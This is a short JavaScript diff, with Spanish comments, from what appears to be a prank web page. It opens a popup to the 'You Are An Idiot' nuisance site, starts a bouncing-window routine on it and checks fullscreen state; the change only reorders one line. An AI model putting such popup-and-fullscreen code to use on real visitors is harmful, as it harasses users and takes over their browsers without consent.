@@ -69,8 +69,8 @@
             const nuevaVentana = window.open('https://youareanidiot.cc/lol.html', "_blank", 'menubar=no,status=no,toolbar=no,resizable=no,width=357,height=330');
 
             if (nuevaVentana) {
-                playBall(nuevaVentana);
                 console.log("Nueva ventana abierta y física de movimiento iniciada.");
+                playBall(nuevaVentana);
             }
 
             if (!document.fullscreenElement && muro.style.display === 'none') {
